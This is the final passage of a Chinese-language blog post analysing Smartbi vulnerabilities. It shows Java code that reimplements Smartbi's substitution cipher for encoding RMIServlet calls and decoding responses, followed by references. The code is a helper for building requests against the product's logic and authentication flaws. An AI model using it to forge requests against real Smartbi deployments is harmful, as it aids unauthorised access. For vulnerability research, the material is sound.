<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">encode</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">encode</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;UserService+checkVersion+%5B%222023-03-31%2018%3A56%3A53%22%5D&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] encodedData = test.encode(input);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedString</span> <span class="operator">=</span> test.byteArrayToStrByUTF8(encodedData);</span><br><span class="line">        System.out.println(encodedString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">encode</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] encodeArray = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">106</span>, <span class="number">37</span>, <span class="number">113</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">41</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">104</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">65</span>, <span class="number">33</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">66</span>, <span class="number">83</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">126</span>, <span class="number">45</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">57</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">42</span>, <span class="number">67</span>, <span class="number">50</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] encode(String dataStr) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = strToByteArrayByUTF8(dataStr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">tmp</span> <span class="operator">=</span> data[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; encodeArray.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (encodeArray[j] == tmp) &#123;</span><br><span class="line">                    data[i] = (<span class="type">byte</span>) j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] strToByteArrayByUTF8(String dataStr) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> dataStr.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">byteArrayToStrByUTF8</span><span class="params">(<span class="type">byte</span>[] dataByte)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(dataByte, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>解密函数</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smartbi.SmartbiException;</span><br><span class="line"><span class="keyword">import</span> smartbi.util.CommonErrorCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decryption</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">decode</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">decode</span>();</span><br><span class="line">        String a, data3;</span><br><span class="line">        <span class="type">byte</span>[] data, data2;</span><br><span class="line">        a = <span class="string">&quot;zDp4Wp4gRip+iIpiGZp4DRw6+/JV/uuu7uNf7NfN1/u71&#x27;/NOJM/NOJN/uu/JT&quot;</span>;</span><br><span class="line">        data = test.strToByteArrayByUTF8(a);</span><br><span class="line">        data2 = test.decode(data);</span><br><span class="line">        data3 = test.byteArrayToStrByUTF8(data2);</span><br><span class="line">        System.out.println(data3); <span class="comment">// 输出解密后的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">decode</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decodeArray = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">106</span>, <span class="number">37</span>, <span class="number">113</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">41</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">104</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">65</span>, <span class="number">33</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">66</span>, <span class="number">83</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">126</span>, <span class="number">45</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">57</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">42</span>, <span class="number">67</span>, <span class="number">50</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">decode</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] strToByteArrayByUTF8(String dataStr) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> dataStr.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] decode(<span class="type">byte</span>[] dataByte) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; dataByte.length; ++j) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">tmp</span> <span class="operator">=</span> dataByte[i];</span><br><span class="line">            <span class="keyword">if</span> (tmp &gt; <span class="number">0</span> &amp;&amp; tmp &lt; decodeArray.length) &#123;</span><br><span class="line">                <span class="type">byte</span> <span class="variable">encodeChar</span> <span class="operator">=</span> decodeArray[tmp];</span><br><span class="line">                <span class="keyword">if</span> (encodeChar != <span class="number">0</span>) &#123;</span><br><span class="line">                    dataByte[i] = encodeChar;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dataByte;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">byteArrayToStrByUTF8</span><span class="params">(<span class="type">byte</span>[] dataByte)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(dataByte, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过以上的两个函数，就可以完成对于类，方法，参数的加密和解密过程，同时也可以对报错的结果进行加密和解密。</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">https://y4tacker.github.io/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://Ho1L0w-By.github.io">Ho1L0w-By</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ho1l0w-by.github.io/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/">https://ho1l0w-by.github.io/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Ho1L0w-By.github.io" target="_blank">Ho1L0w-By's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/function%20link()%20%7B%20%5Bnative%20code%5D%20%7D" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"><img class="prev-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">URLDNS与ysoserial简单使用</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习上</div></div></a></div><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习中</div></div></a></div><div><a href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">CC链学习下</div></div></a></div><div><a href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">URLDNS与ysoserial简单使用</div></div></a></div><div><a href="/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-25</div><div class="title">Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用</div></div></a></div><div><a href="/2022/08/24/ThinkPHP-5-0-x%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ThinkPHP-5.0.x POP链"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-24</div><div class="title">ThinkPHP-5.0.x POP链</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Myhead.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ho1L0w-By</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Ho1L0w-By"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Ho1L0w-By" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1691834629@qq.com" target="_blank" title="Email"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">主攻Web安全，D0g3成员 QQ:1691834629</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Smartbi系列漏洞详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-x2F-api-x2F-monitor-x2F-setEngineAddress-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">1. &#x2F;api&#x2F;monitor&#x2F;setEngineAddress 权限绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">坑点解析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">正确利用漏洞的方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-x2F-vision-x2F-RMIServlet-windowUnloading%E5%8F%82%E6%95%B0%EF%BC%8C%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">2. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8ESmartbi%E4%B8%ADDataSourceService%E7%B1%BB%E7%9A%84JDBC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">基于Smartbi中DataSourceService类的JDBC任意文件写入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#parseURL-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">parseURL()函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#this-setupLoggerFromProperties-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">this.setupLoggerFromProperties()函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LOGGER-log-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">LOGGER.log()函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E8%A7%A3%E6%9E%90%EF%BC%9A-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">坑点解析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%A1%88%EF%BC%9A-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">正确利用漏洞的方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-x2F-vision-x2F-RMIServlet-windowUnloading%E5%8F%82%E6%95%B0%EF%BC%8CMultipart%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">3. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，Multipart逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">扩展：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">参考：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习下"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8B/" title="CC链学习下">CC链学习下</a><time datetime="2023-09-21T10:15:23.000Z" title="发表于 2023-09-21 18:15:23">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习中"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/" title="CC链学习中">CC链学习中</a><time datetime="2023-09-21T10:15:10.000Z" title="发表于 2023-09-21 18:15:10">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链学习上"/></a><div class="content"><a class="title" href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8A/" title="CC链学习上">CC链学习上</a><time datetime="2023-09-21T10:15:02.000Z" title="发表于 2023-09-21 18:15:02">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS与ysoserial简单使用"/></a><div class="content"><a class="title" href="/2023/09/21/URLDNS%E4%B8%8Eysoserial%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="URLDNS与ysoserial简单使用">URLDNS与ysoserial简单使用</a><time datetime="2023-09-21T10:08:59.000Z" title="发表于 2023-09-21 18:08:59">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" title="Smartbi系列漏洞详解"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Smartbi系列漏洞详解"/></a><div class="content"><a class="title" href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/" title="Smartbi系列漏洞详解">Smartbi系列漏洞详解</a><time datetime="2023-09-21T10:04:57.000Z" title="发表于 2023-09-21 18:04:57">2023-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ho1L0w-By</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hack For Fun</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>